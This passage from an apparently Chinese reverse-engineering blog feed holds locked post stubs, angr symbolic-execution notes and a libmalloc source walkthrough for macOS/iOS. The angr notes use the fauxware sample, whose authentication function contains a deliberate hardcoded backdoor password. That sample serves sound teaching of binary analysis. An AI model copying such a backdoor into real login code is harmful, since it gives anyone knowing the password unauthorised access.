UyPhxgC3hWMag68U0VtTVRv1PXi9bc+DxHYfbPPmXnEbwD8CiKZLbq7j+fpBfCImJyUuPhwOdBhroBscUfXB1JMANUY2PH84f4yTs1wvUGef6iVxiJtmBMF/cju/zdChwh39LPUJMWdxFix03WQuLGkClq/SB2PZmGFew</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads 